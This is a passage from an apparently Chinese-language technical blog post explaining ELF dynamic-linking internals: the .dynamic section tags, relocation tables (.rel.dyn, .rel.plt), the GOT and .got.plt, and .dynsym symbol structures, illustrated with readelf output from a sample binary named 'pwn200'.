class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMBOLIC 16  <span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_REL      17  <span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELSZ    18  <span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELENT   19  <span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTREL   20  <span class="comment">/* Type of reloc in PLT */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_DEBUG    21  <span class="comment">/* For debugging; unspecified */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_TEXTREL  22  <span class="comment">/* Reloc might modify .text */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_JMPREL   23  <span class="comment">/* Address of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_BIND_NOW 24  <span class="comment">/* Process relocations of object */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT_ARRAY 25  <span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI_ARRAY 26  <span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT_ARRAYSZ 27  <span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI_ARRAYSZ 28  <span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RUNPATH      29  <span class="comment">/* Library search path */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FLAGS        30  <span class="comment">/* Flags for the object being loaded */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_ENCODING     31  <span class="comment">/* Start of encoded range */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PREINIT_ARRAY 32  <span class="comment">/* Array with addresses of preinit fct*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PREINIT_ARRAYSZ 33  <span class="comment">/* size in bytes of DT_PREINIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMTAB_SHNDX    34  <span class="comment">/* Address of SYMTAB_SHNDX section */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NUM             35  <span class="comment">/* Number used */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_LOOS    0x6000000d  <span class="comment">/* Start of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HIOS    0x6ffff000  <span class="comment">/* End of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_LOPROC  0x70000000  <span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HIPROC  0x7fffffff  <span class="comment">/* End of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PROCNUM DT_MIPS_NUM  <span class="comment">/* Most used by any processor */</span></span></span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;上表中只列出了<code>一部分定义</code>，还有一些不太常用的定义我们就暂且忽略，具体可以参考<code>LSB手册</code>和<code>elf.h的定义</code>。从上面给出的这些定义来看，<code>“.dynamic”</code>节里面保存的信息有点像<code>ELF文件头</code>，只是我们前面看到的<code>ELF文件头</code>中保存的是<code>静态链接</code>时相关的内容，比如<code>静态链接</code>时用到的<code>符号表</code>、<code>重定位表</code>等，这里换成了<code>动态链接</code>下所使用的相应信息了。所以，<code>“.dynamic”</code>节可以看成是<code>动态链接</code>下<code>ELF文件的“文件头”</code>。使用<code>readelf</code>工具可以查看<code>“.dynamic”节</code>的内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d pwn200</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x750 contains 25 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048328</span><br><span class="line"> 0x0000000d (FINI)                       0x8048650</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049744</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049748</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x00000004 (HASH)                       0x804818c</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481c0</span><br><span class="line"> 0x00000005 (STRTAB)                     0x8048260</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481e0</span><br><span class="line"> 0x0000000a (STRSZ)                      95 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x8049844</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   48 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x80482f8</span><br><span class="line"> 0x00000011 (REL)                        0x80482f0</span><br><span class="line"> 0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482d0</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482c0</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></p><h3 id="2-3、“-rel-dyn”节和“-rel-plt”节"><a href="#2-3、“-rel-dyn”节和“-rel-plt”节" class="headerlink" title="2.3、“.rel.dyn”节和“.rel.plt”节"></a>2.3、“.rel.dyn”节和“.rel.plt”节</h3><p>&emsp;&emsp;我们可以使用<code>readelf</code>查看重定位表节：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r pwn200</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.dyn'</span> at offset 0x2f0 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049840  00000206 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.plt'</span> at offset 0x2f8 contains 6 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049850  00000107 R_386_JUMP_SLOT   00000000   <span class="built_in">read</span>@GLIBC_2.0</span><br><span class="line">08049854  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">08049858  00000307 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class="line">0804985c  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">08049860  00000507 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br><span class="line">08049864  00000607 R_386_JUMP_SLOT   00000000   strncmp@GLIBC_2.0</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>“.rel.dyn”</code></strong>实际上是对<code>数据引用</code>的修正，它所修正的位置位于<code>“.got”</code>以及<code>数据节</code>；而<strong><code>“.rel.plt”</code></strong>是对<code>函数引用</code>的修正，它所修正的位置位于<code>“.got.plt”</code>。<br>&emsp;&emsp;<code>32位</code>和<code>64位</code>ELF使用的<code>重定位表</code>有一点区别，但都是<code>结构体数组</code>。一般<code>32位</code>使用<strong><code>Elf32_Rel</code></strong>,<code>64位</code>使用<strong><code>Elf32_Rela</code></strong>。结构体定义如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset; <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf32_Word r_info;   <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Addr r_offset; <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf64_Xword r_info;  <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;  <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf32_Word r_info;    <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">    Elf32_Sword r_addend; <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf32_Rela;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Addr r_offset;  <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf64_Xword r_info;   <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">    Elf64_Sxword r_addend; <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="comment">//获得高24位，表示在符号表中的下标</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)  ((val) &gt;&gt; 8) </span></span><br><span class="line"><span class="comment">//获得低8位，表示重定位类型</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(val)  ((val) &amp; 0xff) </span></span><br><span class="line"><span class="comment">//通过R_SYM和R_Type重组r_info</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type)  (((sym) &lt;&lt; 8) + ((type) &amp; 0xff)) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获得高32位，表示在符号表中的下标</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)  ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="comment">//获得低32位，表示重定位类型</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)  ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="comment">//通过R_SYM和R_Type重组r_info</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)  ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>32位ELF</code></strong>一般使用的<code>重定位表项</code>的结构体是<strong><code>Elf32_Rel</code></strong>，其中包含<code>r_offset</code>和<code>r_info</code>两个成员，都是<code>4byte</code>类型的变量。<strong><code>r_offset：</code></strong>表示重定位所<code>作用的位置</code>。对于<code>重定位文件(.o)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>在<code>其所在节</code>中的<code>字节偏移量</code>；对于<code>可执行文件</code>或<code>共享目标文件(.so)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>的<code>虚拟地址</code>。<strong><code>r_info：</code></strong>其<code>高24位</code>表示该重定位项在<code>动态链接符号表.dynsym</code>中对应项的<code>下标</code>，<code>低8位</code>表示该重定位项的<code>重定向类型</code>。<br>&emsp;&emsp;<strong><code>64位ELF</code></strong>一般使用的<code>重定位表项</code>的结构体是<strong><code>Elf64_Rela</code></strong>，其中包含<code>r_offset</code>、<code>r_info</code>和<code>r_addend</code>三个成员，都是<code>8byte</code>类型的变量。<strong><code>r_offset：</code></strong>表示重定位所<code>作用的位置</code>。对于<code>重定位文件(.o)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>在<code>其所在节</code>中的<code>字节偏移量</code>；对于<code>可执行文件</code>或<code>共享目标文件(.so)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>的<code>虚拟地址</code>。<strong><code>r_info：</code></strong>其<code>高32位</code>表示该重定位项在<code>动态链接符号表.dynsym</code>中对应项的<code>下标</code>，<code>低32位</code>表示该重定位项的<code>重定向类型</code>。<strong><code>r_addend：</code></strong>此成员指定<code>常量加数</code>，用于计算将存储在<code>可重定位字段中的值</code>。<code>Elf32_Rela</code>中是用r_addend<code>显式</code>地指出加数;而对 <code>Elf32_Rel</code>来说,加数是<code>隐含</code>在被修改的位置里的。在<code>所有情况</code>下，<code>加数</code>和<code>计算所得的结果</code>使用相同的<code>字节顺序</code>。<code>加数值</code>的<code>重定位项类型</code>和<code>解释</code>由特定于平台的 ABI 定义。<br>&emsp;&emsp;<code>重定位节</code>可以引用其他两个节：<code>符号表</code>（由 <code>sh_link</code> 节头项标识）和<code>要修改的节</code>（由 <code>sh_info</code> 节头项标识）。节中指定了这些关系。如果<code>可重定位目标文件</code>中存在<code>重定位节</code>，则需要 <code>sh_info</code> 项，但对于<code>可执行文件</code>和<code>共享目标文件</code>，该项是<code>可选的</code>。<code>重定位偏移(r_offset)</code>满足执行重定位的要求。<code>不同的ELF文件</code>中,重定位项的 <code>r_offset</code> 成员的<code>含义</code>略有不同,但其重定位的<code>作用</code>是不变的。<br>&emsp;&emsp;在所有情况下，<code>r_offset</code> 值都会指定<code>受影响存储单元</code>的<code>第一个字节</code>的<code>偏移</code>或<code>虚拟地址</code>。<code>重定位类型</code>可指定<code>要更改的位</code>以及<code>计算这些位的值</code>的方法。</p><blockquote><ul><li>1、<strong><code>重定位文件(.o)</code></strong>中,<code>r_offset</code> 成员含有一个<code>节偏移量</code>。也就是说,重定位节本身描述的是如何修改文件中的另一个节的内容,重定位偏移量(r_offset)指向了另一个节中的一个存储单元地址。 [<a href="#Ref2">2</a>]</li><li>2、在<strong><code>可执行文件</code></strong>或<strong><code>共享目标文件(.so)</code></strong>中,<code>r_offset</code> 含有的是<code>符号定义</code>在进程空间中的<code>虚拟地址</code>。<code>可执行文件</code>和<code>共享目标文件</code>是用于<code>运行程序</code>而不是<code>构建程序</code>的,所以对它们来说更有用的信息是运行期的内存虚拟地址,而不是某个符号定义在文件中的位置。[<a href="#Ref2">2</a>]</li></ul></blockquote><p><strong><code>重定位类型(Relocation Types)</code></strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* i386 relocs.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_NONE     0  <span class="comment">/* No reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_32       1  <span class="comment">/* Direct 32 bit  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_PC32     2  <span class="comment">/* PC relative 32 bit */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_GOT32    3  <span class="comment">/* 32 bit GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_PLT32    4  <span class="comment">/* 32 bit PLT address */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_COPY     5  <span class="comment">/* Copy symbol at runtime */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_GLOB_DAT 6  <span class="comment">/* Create GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_JMP_SLOT 7  <span class="comment">/* Create PLT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_RELATIVE 8  <span class="comment">/* Adjust by program base */</span></span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">/* AMD x86-64 relocations.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_NONE      0  <span class="comment">/* No reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_64        1  <span class="comment">/* Direct 64 bit  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_PC32      2  <span class="comment">/* PC relative 32 bit signed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_GOT32     3  <span class="comment">/* 32 bit GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_PLT32     4  <span class="comment">/* 32 bit PLT address */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_COPY      5  <span class="comment">/* Copy symbol at runtime */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_GLOB_DAT  6  <span class="comment">/* Create GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_JUMP_SLOT 7  <span class="comment">/* Create PLT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_RELATIVE  8  <span class="comment">/* Adjust by program base */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_GOTPCREL  9  <span class="comment">/* 32 bit signed PC relative offset to GOT */</span></span></span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>32位ELF</code></strong>一般用来函数重定位的重定位类型就是<code>R_386_JMP_SLOT</code>类型,<strong><code>64位ELF</code></strong>函数重定位的重定位类型就是<code>R_X86_64_JUMP_SLOT</code>类型，源码对其的注释是<code>Create PLT entry</code>。这种类型的<code>函数重定位</code>都会在ELF中创建一个<code>PLT入口</code>。</p><h3 id="2-4、“-got”节和“-got-plt”节"><a href="#2-4、“-got”节和“-got-plt”节" class="headerlink" title="2.4、“.got”节和“.got.plt”节"></a>2.4、“.got”节和“.got.plt”节</h3><p><strong><code>GOT表</code></strong>在ELF文件中分为<code>两个部分</code>：</p><blockquote><ul><li><strong><code>.got</code></strong>：存储对<code>全局变量</code>的引用。</li><li><strong><code>.got.plt</code></strong>：存储对<code>函数</code>的引用。</li></ul></blockquote><p>前面讲<code>延迟绑定</code>的时候讲过，<strong><code>.got.plt</code></strong>的<code>前三项</code>具有特殊的含义：</p><blockquote><ul><li><strong><code>GOT[0]</code></strong>：保存的是<code>“.dynamic”节</code>的地址。</li><li><strong><code>GOT[1]</code></strong>：保存的是<code>本模块的ID</code>。指向内部类型为<code>link_map的指针</code>，只会在<code>动态链接器</code>中使用，包含了进行<code>符号解析</code>需要的<code>当前ELF共享目标文件</code>的信息。每个 <code>link_map</code>都是一条<code>双向链表</code>的一个节点，而这个链表保存了所有加载的<code>ELF共享目标文件</code>的信息。<code>动态链接器</code>利用<code>该地址</code>来对<code>符号</code>进行解析。</li><li><strong><code>GOT[2]</code></strong>：保存的是<code>_dl_runtime_resolve()</code>的地址。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>解析之前</code></strong>，GOT表的<code>其他表项</code>存储的是所解析函数对应的<code>PLT表项第二条指令的地址</code>。<strong><code>解析之后</code></strong>，存储的是<code>函数的真实地址</code>。</p><h3 id="2-5、“-dynsym”节"><a href="#2-5、“-dynsym”节" class="headerlink" title="2.5、“.dynsym”节"></a>2.5、“.dynsym”节</h3><p>&emsp;&emsp;<strong><code>“.dynsym”节</code></strong>是<code>动态链接符号表</code>。这里保存的是一个<code>结构体数组</code>，结构体的<code>定义</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word    st_name;  <span class="comment">/* 符号名，符号在字符串表中的偏移 */</span></span><br><span class="line">    Elf32_Addr    st_value; <span class="comment">/* 符号的值，可能是地址或偏移 */</span></span><br><span class="line">    Elf32_Word    st_size;  <span class="comment">/* 符号的大小 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">/* 符号类型及绑定属性 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">/* 符号的可见性 */</span></span><br><span class="line">    Elf32_Section st_shndx; <span class="comment">/* 节头表索引 */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  Elf64_Word    st_name;  <span class="comment">/* 符号名，符号在字符串表中的偏移 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">/* 符号类型及绑定属性 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">/* 符号的可见性 */</span></span><br><span class="line">  Elf64_Section st_shndx; <span class="comment">/* 节头表索引 */</span></span><br><span class="line">  Elf64_Addr    st_value; <span class="comment">/* 符号的值，可能是地址或偏移 */</span></span><br><span class="line">  Elf64_Xword   st_size;  <span class="comment">/* 符号的大小 */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* st_info字段中符号类型和绑定属性的提取 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(val) (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(val) ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(bind, type) (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"><span class="comment">/* Elf32_Sym和Elf64_Sym都使用相同的一字节的st_info字段 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_BIND(val) ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_TYPE(val) ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_INFO(bind, type) ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们主要关注此结构体中的<strong><code>两个成员</code></strong>(注意<code>32位</code>和<code>64位</code>中这两个值在结构体里的<code>位置</code>不一样！)</p><blockquote><ul><li><strong><code>st_name</code></strong>：该成员保存着符号在<code>.dynstr表</code>（动态链接字符串表）中的<code>偏移</code>。</li><li><strong><code>st_value</code></strong>：如果这个符号<code>被导出</code>，这个符号保存着对应的<code>虚拟地址</code>。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>st_other</code></strong>：st_other 变量定义了<code>符号的可见性</code>。</p><p><strong><code>符号可见性规范</code></strong>：<a href="https://www.ibm.com/developerworks/cn/aix/library/au-aix-symbol-visibility/" target="_blank" rel="noopener">第 1 部分 - 符号可见性简介</a></p><blockquote><ul><li><strong><code>STV_DEFAULT(0)</code></strong>：默认符号可见性规则。用它定义的符号将被导出。换句话说，它声明符号是到处可见的。</li><li><strong><code>STV_INTERNAL(1)</code></strong>：特定于处理器的隐藏类。符号在当前可执行文件或共享库之外不可访问。</li><li><strong><code>STV_HIDDEN(2)</code></strong>：Sym在其他模块中不可用。用它定义的符号将不被导出，并且不能从其他对象进行使用。</li><li><strong><code>STV_PROTECTED(3)</code></strong>：不可抢占，不可导出。符号在当前可执行文件或共享对象之外可见，但是不会被覆盖。换句话说，如果共享库中的一个受保护符号被该共享库中的另一个代码引用，那么此代码将总是引用共享库中的此符号，即便可执行文件定义了相同名称的符号。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>st_shndx</code></strong>：每个<code>符号表条目的定义</code>都与<code>某些节</code>对应。<code>st_shndx</code>变量保存了相关<code>节头表的索引</code>。</p><p><strong><code>特殊节索引</code></strong>：<a href="https://docs.oracle.com/cd/E19683-01/817-3677/chapter6-94076/index.html" target="_blank" rel="noopener">Linker and Libraries Guide</a></p><table><thead><tr><th style="text-align:left">宏定义</th><th style="text-align:center">值</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">SHN_UNDEF</td><td style="text-align:center">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  0x0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</td><td style="text-align:left">未定义的、丢失的、不相关的或其他没有意义的节引用。例如，相对于节号SHN_UNDEF定义的符号是未定义的符号。该符号在本目标文件中被引用到，但是定义在其他目标文件中。</td></tr><tr><td style="text-align:left">SHN_LORESERVE</td><td style="text-align:center">0xFF00</td><td style="text-align:left">被保留索引号区间的下限。</td></tr><tr><td style="text-align:left">SHN_LOPROC</td><td style="text-align:center">0xFF00</td><td style="text-align:left">为特定处理器定制节所保留的索引号区间的下限。</td></tr><tr><td style="text-align:left">SHN_BEFORE</td><td style="text-align:center">0xFF00</td><td style="text-align:left">优先于其他节的排序节(Solaris)。与SHF_LINK_ORDER和SHF_ORDERED节标志一起规定初始和最终节顺序。</td></tr><tr><td style="text-align:left">SHN_AFTER</td><td style="text-align:center">0xFF01</td><td style="text-align:left">在其他节之后的排序节(Solaris)。与SHF_LINK_ORDER和SHF_ORDERED节标志一起规定初始和最终节顺序。</td></tr><tr><td style="text-align:left">SHN_HIPROC</td><td style="text-align:center">0xFF1F</td><td style="text-align:left">为特定处理器定制节所保留的索引号区间的上限。</td></tr><tr><td style="text-align:left">SHN_LOOS</td><td style="text-align:center">0xFF20</td><td style="text-align:left">为特定操作系统定制节所保留的索引号区间的下限。</td></tr><tr><td style="text-align:left">SHN_HIOS</td><td style="text-align:center">0xFF3F</td><td style="text-align:left">为特定操作系统定制节所保留的索引号区间的上限。</td></tr><tr><td style="text-align:left">SHN_ABS</td><td 